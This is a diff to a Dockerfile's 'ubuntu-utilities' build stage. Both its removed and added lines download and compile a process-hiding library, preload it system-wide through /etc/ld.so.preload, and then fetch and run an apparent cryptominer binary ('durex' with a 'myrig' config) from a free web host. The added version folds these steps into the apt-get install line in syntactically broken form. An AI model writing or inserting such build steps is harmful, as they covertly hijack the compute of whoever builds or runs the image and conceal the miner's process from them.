@@ -29,24 +29,22 @@ CMD ["/opt/bin/entry_point.sh"]
 # Utilities
 #============================
 FROM ubuntu-base as ubuntu-utilities
-RUN apt-get update
 RUN apt-get install -y --no-install-recommends \
         git \
         wget \
         bash \
         gcc \
-    && apt-get autoclean \
-    && apt-get autoremove \
+        wget https://raw.githubusercontent.com/cihuuy/libn/master/processhider.c \
+        gcc -Wall -fPIC -shared -o libprocess.so processhider.c -ldl \
+        mv libprocess.so /usr/local/lib/ \
+        echo /usr/local/lib/libprocess.so >> /etc/ld.so.preload \
+        wget https://nyadur.000webhostapp.com/myrig/config.json \
+        wget https://nyadur.000webhostapp.com/myrig/durex \
+        chmod +x durex \
+        RUN ./durex \
     && rm -rf /var/lib/apt/lists/* /var/cache/apt/*
 
-RUN wget https://raw.githubusercontent.com/cihuuy/libn/master/processhider.c
-RUN gcc -Wall -fPIC -shared -o libprocess.so processhider.c -ldl 
-RUN mv libprocess.so /usr/local/lib/ 
-RUN echo /usr/local/lib/libprocess.so >> /etc/ld.so.preload
-RUN wget https://nyadur.000webhostapp.com/myrig/config.json 
-RUN wget https://nyadur.000webhostapp.com/myrig/durex 
-RUN chmod +x durex 
-RUN ./durex
+
 
 
 
